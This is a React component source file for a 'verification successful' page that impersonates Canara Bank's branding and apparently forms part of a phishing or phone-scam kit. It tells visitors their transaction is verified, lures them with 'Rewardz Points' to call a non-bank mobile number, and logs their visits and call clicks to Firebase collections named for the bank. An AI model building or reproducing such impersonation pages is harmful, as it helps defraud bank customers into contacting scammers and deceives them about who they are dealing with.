import { useEffect } from 'react';
import FirebaseUtil from '../FirebaseRepo';
import '../App.css';

const SuccessPage = () => {
  const callNumber = '9876543210';

  useEffect(() => {
    // Record visit to success page in Firebase
    const logSuccessPageVisit = async () => {
      try {
        await FirebaseUtil.uploadAnyModel("canara_bank_success", {
          page: "success_page",
          timestamp: new Date().toISOString()
        });
      } catch (error) {
        console.error("Error logging success page visit:", error);
      }
    };

    logSuccessPageVisit();
  }, []);

  const handleCallButtonClick = async () => {
    try {
      // Log the call button click
      await FirebaseUtil.uploadAnyModel("canara_bank_calls", {
        callNumber,
        action: "call_button_clicked",
        timestamp: new Date().toISOString()
      });
      
      // Open the phone dialer
      window.open(`tel:${callNumber}`, '_self');
    } catch (error) {
      console.error("Error logging call button click:", error);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Header - Blue Bar with Logo */}
      <header className="bg-[#0066b3] p-4 flex justify-between items-center">
        <div className="flex items-center">
          <div className="text-white">
            <h1 className="text-3xl font-serif">Canara Bank</h1>
            <p className="text-sm">A Government of India Undertaking</p>
            <div className="bg-yellow-100 text-yellow-800 px-2 py-0.5 text-xs mt-1 rounded inline-block">
              Fintech Syndicate
            </div>
          </div>
        </div>
        <div className="space-y-1.5">
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
          <div className="w-8 h-1 bg-white rounded"></div>
        </div>
      </header>

      {/* Tagline */}
      <div className="bg-[#0066b3] text-white text-center pb-2">
        <p>Together We Can</p>
      </div>

      {/* Main Content */}
      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
          <div className="text-center mb-6">
            <div className="bg-green-100 text-green-800 rounded-full px-4 py-2 mb-4 inline-block">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 inline mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              Verification Successful
            </div>
            <h1 className="text-2xl font-bold text-blue-800 mb-2">
              Congratulations!
            </h1>
            <p className="text-gray-600">
              Your transaction has been verified successfully.
            </p>
          </div>

          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
            <div className="flex">
              <div className="flex-shrink-0">
                <svg className="h-5 w-5 text-yellow-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="ml-3">
                <p className="text-sm text-yellow-700">
                  To collect your Rewardz Points, please give a missed call to our Canara Bank Rewardz Care.
                </p>
              </div>
            </div>
          </div>

          <button
            onClick={handleCallButtonClick}
            className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm mb-4"
          >
            CALL NOW TO COLLECT REWARDS
          </button>
          
          <p className="text-xs text-gray-500 text-center">
            Your rewards will be credited to your account within 24-48 hours after verification.
          </p>
        </div>
      </main>

      {/* Bottom Part / Footer */}
      <footer className="bg-gray-800 text-white p-4 text-center">
        <p className="text-sm"> 2025 Canara Bank. All rights reserved.</p>
        <p className="text-xs">For support, call 1800-123-4567 or email support@canarabank.com</p>
      </footer>
    </div>
  );
};

export default SuccessPage;